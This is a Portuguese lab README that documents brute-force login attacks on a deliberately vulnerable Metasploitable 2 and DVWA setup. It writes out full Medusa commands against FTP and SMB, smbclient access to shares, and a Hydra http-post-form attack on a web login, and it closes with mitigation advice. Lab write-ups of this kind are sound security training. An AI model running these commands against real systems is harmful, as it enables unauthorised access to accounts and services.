# Medusa-dio

Projeto de Prática: Ataque de Força Bruta com Medusa no Kali Linux
Objetivo
Demonstrar um ataque de força bruta contra serviços vulneráveis utilizando a ferramenta Medusa no ambiente Kali Linux. O ataque será realizado em um laboratório controlado com máquinas virtuais (Metasploitable 2 e DVWA), documentando o processo, os comandos utilizados e as recomendações de mitigação.

Ambiente do Laboratório
Máquina	Função	IP
Kali Linux	Atacante	(configuração local)
Metasploitable 2	Alvo	192.168.56.2
Credenciais padrão do Metasploitable 2:

Usuário: msfadmin

Senha: msfadmin

Teste de Conectividade
Antes de iniciar, verifique a comunicação com o alvo:

bash
ifconfig
ping 192.168.56.2
Criação das Wordlists
Foram criadas listas simples de usuário e senha para o ataque:

bash
# Lista de usuários
echo "msfadmin" > users.txt

# Lista de senhas
echo "msfadmin" > passwords.txt
Comandos Utilizados
1. Ataque de Força Bruta no serviço FTP
bash
# Usando usuário único
medusa -h 192.168.56.2 -u msfadmin -P passwords.txt -M ftp

# Usando lista de usuários
medusa -h 192.168.56.2 -U users.txt -P passwords.txt -M ftp
2. Ataque de Força Bruta no serviço SMB
bash
medusa -h 192.168.56.2 -U users.txt -P passwords.txt -M smbnt
3. Testando acesso via SMBClient
bash
# Listar compartilhamentos
smbclient -L //192.168.56.2 -U msfadmin

# Acessar o compartilhamento tmp
smbclient //192.168.56.2/tmp -U msfadmin
4. Ataque de Força Bruta em formulário web (DVWA com Hydra)
bash
hydra -L users.txt -P passwords.txt 192.168.56.2 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login"
Aprendizados Obtidos
Como ataques de força bruta funcionam em serviços como FTP, SMB e formulários web

Criação de wordlists personalizadas conforme o ambiente alvo

Automação de testes com ferramentas open-source (Medusa e Hydra)

Análise dos resultados e validação de acessos obtidos

Recomendações de Segurança
Para mitigar ataques de força bruta, adote as seguintes práticas:

Autenticação multifator – habilite MFA sempre que possível

Política de senhas robustas – exija complexidade e renovação periódica

Limitação de tentativas – monitore e restrinja tentativas consecutivas de login

Atualização contínua – mantenha softwares e serviços sempre atualizados
